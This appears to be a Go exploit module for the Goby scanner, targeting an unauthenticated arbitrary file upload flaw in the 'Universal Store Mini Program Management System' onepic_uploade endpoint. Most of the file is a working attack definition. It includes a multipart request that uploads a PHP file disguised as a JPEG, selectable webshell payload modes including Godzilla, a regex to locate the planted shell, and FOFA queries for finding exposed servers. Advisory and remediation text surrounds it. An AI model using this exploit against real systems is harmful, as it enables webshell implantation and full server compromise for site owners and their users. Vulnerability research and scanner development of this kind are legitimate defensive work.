package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Universal Store Mini Program Management System /comadmin/Remote/onepic_uploade File Upload Vulnerability",
    "Description": "<p>The Universal Store Mini Program Management System is a powerful tool designed to provide comprehensive online and offline solutions for businesses across various industries. The system integrates core functions of membership management and marketing, supports multi-industry use, and allows version switching through the backend to meet the personalized needs of different businesses. It adopts a lightweight backend and efficient servers to ensure smooth operation of mini-programs and enhance user experience. The onepic_uploade interface of the Universal Store Mini Program Management System has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload malicious files, execute arbitrary code, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Product": "Universal Store Mini Program Management System",
    "Homepage": "https://diy.aoliqi.cn/",
    "DisclosureDate": "2024-11-28",
    "PostTime": "2024-11-28",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/comhome/cases/index.html\" && title=\"小程序\"",
    "GobyQuery": "body=\"/comhome/cases/index.html\" && title=\"小程序\"",
    "Level": "3",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to upload malicious files and execute arbitrary code on the server, which may lead to complete server control, sensitive data leakage, and business interruption.</p>",
    "Recommendation": "<p>1. Close exposed interfaces on the Internet or set strict access permissions.</p><p>2. Upgrade to a secure version to fix the vulnerability.</p><p>3. Strictly validate file types for the file upload function to prevent malicious files from being uploaded.4. The manufacturer has not released a fixed version yet, pay attention to <a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a></p>",
    "References": [
        "https://fmy1024.cn/html_online/5317_144110824online.html",
        "https://blog.csdn.net/qq_41904294/article/details/144110824"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Customize",
            "show": ""
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/comadmin/Remote/onepic_uploade?file=file",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryBiKyL9D0p5OtH5zz\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\nContent-Type: image/jpeg\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryBiKyL9D0p5OtH5zz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|lastbody|regex|https?://(?:.*?)(/upimages/.*?.php)"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "万能门店小程序管理系统 /comadmin/Remote/onepic_uploade 文件上传漏洞",
            "Product": "万能门店小程序管理系统",
            "Description": "<p>万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统的onepic_uploade接口存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意文件，执行任意代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1. 关闭互联网暴露的接口或设置严格的访问权限。</p><p>2. 升级至安全版本以修复漏洞。</p><p>3. 对文件上传功能进行严格的文件类型校验，防止上传恶意文件。</p><p>4.该厂商暂未发布修复版本，关注<a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a></p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者上传恶意文件并在服务器上执行任意代码，可能导致服务器被完全控制、敏感数据泄露以及业务中断等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Universal Store Mini Program Management System /comadmin/Remote/onepic_uploade File Upload Vulnerability",
            "Product": "Universal Store Mini Program Management System",
            "Description": "<p>The Universal Store Mini Program Management System is a powerful tool designed to provide comprehensive online and offline solutions for businesses across various industries. The system integrates core functions of membership management and marketing, supports multi-industry use, and allows version switching through the backend to meet the personalized needs of different businesses. It adopts a lightweight backend and efficient servers to ensure smooth operation of mini-programs and enhance user experience. The onepic_uploade interface of the Universal Store Mini Program Management System has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload malicious files, execute arbitrary code, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "Recommendation": "<p>1. Close exposed interfaces on the Internet or set strict access permissions.</p><p>2. Upgrade to a secure version to fix the vulnerability.</p><p>3. Strictly validate file types for the file upload function to prevent malicious files from being uploaded.<br>4. The manufacturer has not released a fixed version yet, pay attention to <a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a><br></p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to upload malicious files and execute arbitrary code on the server, which may lead to complete server control, sensitive data leakage, and business interruption.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/comadmin/Remote/onepic_uploade?file=file"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9974"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
